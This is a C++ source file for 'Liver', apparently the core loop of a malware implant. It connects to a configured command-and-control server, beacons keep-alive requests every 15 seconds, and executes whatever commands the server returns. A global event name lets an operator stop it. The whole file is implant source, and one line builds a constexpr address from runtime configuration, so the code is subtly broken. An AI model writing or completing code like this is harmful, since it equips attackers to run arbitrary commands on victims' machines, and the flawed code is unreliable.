#include "Include/Liver.hpp"

#include "CommandHandlerFactory.hpp"
#include "ICommandHandler.hpp"
#include "Json.hpp"
#include "LiverConfiguration.hpp"
#include "Trace.hpp"
#include "CommandFactories/JsonCommandFactory.hpp"
#include "Commands/ICommand.hpp"
#include "Communicators/RawCommunicator.hpp"
#include "Communicators/Protocol/KeepAliveRequest.hpp"
#include "Communicators/Protocol/SendRandomResponse.hpp"
#include "Networking/MaintainedSocket.hpp"
#include "Synchronization/Event.hpp"

Liver::Liver(Event::Ptr quit_event,
             ICommandFactory::Ptr command_factory,
             ICommunicator::Ptr communicator,
             const Time::Duration iteration_timeout) :
	m_quit_event(std::move(quit_event)),
	m_command_factory(std::move(command_factory)),
	m_communicator(std::move(communicator)),
	m_iteration_timeout(iteration_timeout),
	libraries()
{
}

void Liver::run()
{
	TRACE(L"running liver");

	while (m_quit_event->wait(m_iteration_timeout) == WaitStatus::TIMEOUT)
	{
		try
		{
			TRACE(L"liver iteration");
			IRequest::Ptr request = get_next_request();
			std::shared_ptr<IResponse> response = m_communicator->send(std::move(request));
			handle_response(std::move(response));
		}
		CATCH_AND_TRACE()
	}

	TRACE(L"finished liver");
}

std::unique_ptr<Liver> Liver::create([[maybe_unused]] const Buffer& liver_configuration)
{
	const LiverConfiguration config = LiverConfiguration::parse(liver_configuration);
	static constexpr SocketAddress cnc_address = {config.cnc_ip, config.cnc_port};
	static constexpr Time::Duration ITERATION_TIMEOUT = Time::Seconds(15);
	return std::make_unique<Liver>(
		std::make_shared<Event>(quit_event_name(), Event::Type::MANUAL_RESET),
		std::make_unique<JsonCommandFactory>(),
		RawCommunicator::from_stream(std::make_shared<MaintainedSocket>(cnc_address)),
		ITERATION_TIMEOUT
	);
}

std::wstring Liver::quit_event_name()
{
	static constexpr std::wstring_view QUIT_EVENT_NAME = L"LiverEvent";
	return std::wstring{Event::GLOBAL_NAMESPACE} + std::wstring{QUIT_EVENT_NAME};
}

IRequest::Ptr Liver::get_next_request()
{
	return std::make_unique<KeepAliveRequest>();
}

void Liver::handle_response(IResponse::Ptr response)
{
	switch (response->type())
	{
	case IResponse::Type::SEND_RANDOM:
	{
		const auto send_random_response = std::dynamic_pointer_cast<SendRandomResponse>(std::move(response));
		TRACE(L"SendRandomResponse random: ", send_random_response->value());
		break;
	}

	case IResponse::Type::EXECUTE_COMMANDS:
	{
		const auto execute_commands_response = std::dynamic_pointer_cast<ExecuteCommandsResponse>(
			std::move(response)
		);
		handle_execute_commands(*execute_commands_response);
		break;
	}

	default:
		throw Exception(ErrorCode::UNCOVERED_ENUM_VALUE);
	}
}

void Liver::handle_execute_commands(const ExecuteCommandsResponse& response)
{
	std::vector<ICommand::Ptr> commands;
	for (const Buffer& command : response.commands())
	{
		commands.push_back(m_command_factory->create(command));
	}
	execute_commands(commands);
}

void Liver::execute_commands(const std::vector<ICommand::Ptr>& commands)
{
	for (const ICommand::Ptr& command : commands)
	{
		const ICommandHandler::Ptr handler = CommandHandlerFactory::create(command);
		handler->handle(*this);
	}
}
